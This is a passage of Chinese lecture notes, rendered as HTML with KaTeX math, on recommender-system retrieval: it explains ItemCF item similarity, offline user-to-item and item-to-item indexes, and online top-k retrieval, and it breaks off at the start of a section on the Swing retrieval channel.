style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 相似，那么用户很可能喜欢物品 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mi>t</mi><mi>e</mi><msub><mi>m</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">item_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80952em;vertical-align:-0.15em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。</p><p>所以需要预估用户对候选物品的兴趣：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><munder><mo>∑</mo><mi>j</mi></munder><mi>l</mi><mi>i</mi><mi>k</mi><mi>e</mi><mo fence="true">(</mo><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mo separator="true">,</mo><mi>i</mi><mi>t</mi><mi>e</mi><mi>m</mi><mrow><msub><mrow></mrow><mi>j</mi></msub><mo fence="true">)</mo></mrow><mo>×</mo><mi mathvariant="normal">sim</mi><mo>⁡</mo><mo fence="true">(</mo><mi>i</mi><mi>t</mi><mi>e</mi><msub><mi>m</mi><mi>j</mi></msub><mo separator="true">,</mo><mi>i</mi><mi>t</mi><mi>e</mi><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\sum_{j} like \left(\right. user, item \left._{j}\right) \times \operatorname{sim}\left(\right. item _{j}, item )</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.463782em;vertical-align:-1.413777em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8723309999999997em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.413777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">u</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen nulldelimiter"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mop"><span class="mord mathrm">s</span><span class="mord mathrm">i</span><span class="mord mathrm">m</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">m</span><span class="mclose">)</span></span></span></span></span></p><p>计算两个物品的相似度：把每个物品表示为⼀个稀疏向量，向量每个元素对应⼀个用户。相似度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>i</mi><mi>m</mi></mrow><annotation encoding="application/x-tex">sim</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault">m</span></span></span></span> 就是两个向量夹角的余弦。</p><h2 id="1-5-itemcf-召回的完整流程">1.5 ItemCF 召回的完整流程</h2><h3 id="1-5-1-事先做离线计算">1.5.1 事先做离线计算</h3><p><strong>建⽴“用户 → 物品”的索引：</strong></p><ul><li>记录每个用户最近点击、交互过的物品 ID</li><li>给定任意用户 ID，可以找到他近期感兴趣的物品列表</li></ul><p><img src="image_3xYvOBHZfB.png" alt=""></p><p><strong>建⽴“物品 → 物品”的索引：</strong></p><ul><li>计算物品之间两两相似度</li><li>对于每个物品，索引它最相似的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span></span></span></span> 个物品</li><li>给定任意物品 ID，可以快速找到它最相似的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span></span></span></span> 个物品</li></ul><p><img src="image_5Foi9x3EcG.png" alt=""></p><h3 id="1-5-2-线上做召回">1.5.2 线上做召回</h3><p>可以按照以下步骤线上做推荐：</p><ol><li>给定用户 ID，通过“用户 → 物品”索引，找到用户近期感兴趣的物品列表（last-n）</li><li>对于 last-n 列表中每个物品，通过“物品 → 物品”的索引，找到 top-k 相似物品</li><li>对于取回的相似物品（最多有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mi>k</mi></mrow><annotation encoding="application/x-tex">nk</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span></span></span></span> 个），用公式预估用户对物品的兴趣分数</li><li>返回分数最⾼的 100 个物品，作为推荐结果</li></ol><p>索引的意义在于避免枚举所有的物品。用索引离线计算量⼤，线上计算量⼩。</p><p><img src="image_4K4c3CZNCD.png" alt=""></p><h2 id="1-6-总结">1.6 总结</h2><h3 id="1-6-1-itemcf的原理">1.6.1 ItemCF的原理</h3><p>用户喜欢物品 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>i</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">i_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80952em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，那么用户喜欢与物品 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>i</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">i_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80952em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 相似的物品 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>i</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">i_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80952em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。</p><p>**物品相似度：**如果喜欢 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>i</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">i_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80952em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>i</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">i_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80952em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的用户有很大的重叠，那么 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>i</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">i_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80952em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 与 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>i</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">i_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80952em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 相似。公式如下：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">sim</mi><mo>⁡</mo><mrow><mo fence="true">(</mo><msub><mi>i</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>i</mi><mn>2</mn></msub><mo fence="true">)</mo></mrow><mo>=</mo><mfrac><mrow><mo fence="true">∣</mo><mi mathvariant="script">W</mi><mi mathvariant="normal">_</mi><mn>1</mn><mo>∩</mo><mi mathvariant="script">W</mi><mi mathvariant="normal">_</mi><mn>2</mn><mo fence="true">∣</mo></mrow><msqrt><mrow><mrow><mo fence="true">∣</mo><msub><mi>W</mi><mn>1</mn></msub><mo fence="true">∣</mo></mrow><mo>⋅</mo><mrow><mo fence="true">∣</mo><mi mathvariant="script">W</mi><mi mathvariant="normal">_</mi><mn>2</mn><mo fence="true">∣</mo></mrow></mrow></msqrt></mfrac></mrow><annotation encoding="application/x-tex">\operatorname{sim}\left(i_{1}, i_{2}\right)=\frac{\left|\mathcal{W}\_{1} \cap \mathcal{W}\_{2}\right|}{\sqrt{\left|W_{1}\right| \cdot\left|\mathcal{W}\_{2}\right|}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop"><span class="mord mathrm">s</span><span class="mord mathrm">i</span><span class="mord mathrm">m</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathdefault">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.3379900000000005em;vertical-align:-1.7300000000000002em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.60799em;"><span style="top:-2.11em;"><span class="pstrut" style="height:3.243985em;"></span><span class="mord"><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.243985em;"><span class="svg-align" style="top:-3.8em;"><span class="pstrut" style="height:3.8em;"></span><span class="mord" style="padding-left:1em;"><span class="minner"><span class="mopen delimcenter" style="top:0em;">∣</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">∣</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8679800000000001em;"><span style="top:-2.2559899999999997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.26698em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.86798em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000999999999993em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">W</span></span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord">2</span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8679800000000001em;"><span style="top:-2.2559899999999997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.26698em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.86798em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000999999999993em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.2039849999999994em;"><span class="pstrut" style="height:3.8em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.8800000000000001em;"><svg width='400em' height='1.8800000000000001em' viewBox='0 0 400000 1944' preserveAspectRatio='xMinYMin slice'><path d='M983 90l0 -0c4,-6.7,10,-10,18,-10 H400000v40H1013.1s-83.4,268,-264.1,840c-180.7,572,-277,876.3,-289,913c-4.7,4.7,-12.7,7,-24,7s-12,0,-12,0c-1.3,-3.3,-3.7,-11.7,-7,-25c-35.3,-125.3,-106.7,-373.3,-214,-744c-10,12,-21,25,-33,39s-32,39,-32,39c-6,-5.3,-15,-14,-27,-26s25,-30,25,-30c26.7,-32.7,52,-63,76,-91s52,-60,52,-60s208,722,208,722c56,-175.3,126.3,-397.3,211,-666c84.7,-268.7,153.8,-488.2,207.5,-658.5c53.7,-170.3,84.5,-266.8,92.5,-289.5zM1001 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5960150000000002em;"><span></span></span></span></span></span></span></span><span style="top:-3.473985em;"><span class="pstrut" style="height:3.243985em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.983995em;"><span class="pstrut" style="height:3.243985em;"></span><span class="mord"><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8679800000000001em;"><span style="top:-2.2559899999999997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.26698em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.86798em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000999999999993em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">W</span></span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord">1</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∩</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">W</span></span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord">2</span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8679800000000001em;"><span style="top:-2.2559899999999997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.26698em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.86798em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000999999999993em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.7300000000000002em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><h3 id="1-6-2-itemcf召回通道">1.6.2 ItemCF召回通道</h3><p>维护两个索引：</p><ol><li>用户 → 物品列表：用户最近交互过的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span></span></span></span> 个物品</li><li>物品 → 物品列表：相似度最⾼的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span></span></span></span> 个物品</li></ol><p>线上做召回：</p><ol><li>利用两个索引，每次取回 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mi>k</mi></mrow><annotation encoding="application/x-tex">nk</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span></span></span></span> 个物品</li><li>预估用户对每个物品的兴趣分数：</li></ol><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><munder><mo>∑</mo><mi>j</mi></munder><mi mathvariant="normal">like</mi><mo>⁡</mo><mo fence="true">(</mo><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mo separator="true">,</mo><mi>i</mi><mi>t</mi><mi>e</mi><mi>m</mi><mrow><msub><mrow></mrow><mi>j</mi></msub><mo fence="true">)</mo></mrow><mo>×</mo><mi mathvariant="normal">sim</mi><mo>⁡</mo><mo fence="true">(</mo><mi>i</mi><mi>t</mi><mi>e</mi><msub><mi>m</mi><mi>j</mi></msub><mo separator="true">,</mo><mi>i</mi><mi>t</mi><mi>e</mi><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\sum_{j} \operatorname{like}\left(\right. user, item \left._{j}\right) \times \operatorname{sim}\left(\right. item _{j}, item )</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.463782em;vertical-align:-1.413777em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8723309999999997em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.413777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mord mathrm">l</span><span class="mord mathrm">i</span><span class="mord mathrm">k</span><span class="mord mathrm">e</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">u</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen nulldelimiter"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mop"><span class="mord mathrm">s</span><span class="mord mathrm">i</span><span class="mord mathrm">m</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">m</span><span class="mclose">)</span></span></span></span></span></p><ol><li>返回分数最高的100个物品，作为召回结果</li></ol><hr><h1>2 Swing 召回通道</h1><h2 id="2-1-原理介绍">2.1 原理介绍</h2><p>Swing 模型的原理就是给用户设置权重，解决小圈子问题。</p><p>喜欢物品 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>u</mi><mn>1</mn></msub></mrow><annotation 